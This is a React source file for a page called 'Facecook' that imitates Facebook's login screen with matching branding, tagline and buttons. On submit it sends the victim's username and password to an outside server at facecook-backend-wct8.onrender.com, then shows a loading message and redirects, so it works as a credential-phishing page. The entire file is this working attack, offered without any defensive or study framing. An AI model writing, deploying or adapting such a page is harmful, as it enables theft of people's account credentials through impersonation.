import React from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const Facecook = () => {
  const [formData, setFormData] = React.useState({ user: "", pass: "" });
  const [loading, setLoading] = React.useState(false);

  const handleLogin = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({ ...prevData, [name]: value }));
  };

  let navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    axios.post(
      "https://facecook-backend-wct8.onrender.com/api/v2/tasks",
      formData
    );
    setLoading(true);

    // set a timeout
    const timeoutId = setTimeout(() => {
      navigate("/submission");
    }, 2000);

    // clear the timeout if the component unmounts
    return () => clearTimeout(timeoutId);
  };

  return (
    <div className="bg-[#f0f2f5] h-screen  w-full font-[Heveltica] flex justify-center items-center ">
      <div className="flex justify-center  h-full flex-col md:flex-row md:gap-[5vw] md:items-center md:justify-center items-center mx-[16px] ">
        <div className="w-90vw]  md:w-[45vw] md:mt--12 flex flex-col  items-center  md:items-start">
          <h2 className=" text-[#1877f2] text-[27px]  md:text-[70px] font-bold md:font-black py-0 sm:text-[50px]">
            facebook
          </h2>

          <p className="hidden md:display-block text-[16px] md:text-xl w-[65%] md:w-[72%] md:text-[30px] md:mb-20">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>

        <form
          onSubmit={handleSubmit}
          className="shadow-xl my-8 w-[90vw] bg-white p-6 rounded-lg md:w-[35vw] md:mb-20 flex flex-col gap-3 justify-center items-center"
        >
          <input
            className="shadow outline-1 w-full font-[Helvetica] p-3 text-[14px] bg-[f5f6f7]  border rounded"
            placeholder="Mobile number or email address"
            type="text"
            name="user"
            value={formData.user}
            onChange={handleLogin}
            required
          />
          <input
            className="shadow outline-1 w-full font-[Helvetica] p-3 text-[14px] bg-[f5f6f7] border  rounded"
            type="text"
            name="pass"
            value={formData.pass}
            onChange={handleLogin}
            placeholder="Password"
            required
          />

          <button
            type="submit"
            cursor-pointer
            className="bg-[#1877f2] py-3 rounded-md font-bold w-[100%] text-white text-[17px] px-[16px]"
          >
            Log in
          </button>
          {loading && (
            <p className="cursor-pointer text-gray-700 text-[14px] font-medium ">
              Loading...
            </p>
          )}

          <p className="cursor-pointer text-[#1877f2] text-[14px] font-medium ">
            Forgotten password?
          </p>

          <div className="border border-b-[#dadde1] w-full my-4"></div>

          <div className=" cursor-pointer text-white bg-[#42b72a] p-3 rounded-md text-[17px] font-bold">
            Create New Account
          </div>
        </form>
        <p className="md:hidden text-[#666] font-[11px] md:font-[14px] w-[75%]">
          <span className=" text-[#1c1e21] font-semibold">Create a Page </span>
          for a celebrity, brand or business
        </p>
      </div>
    </div>
  );
};

export default Facecook;
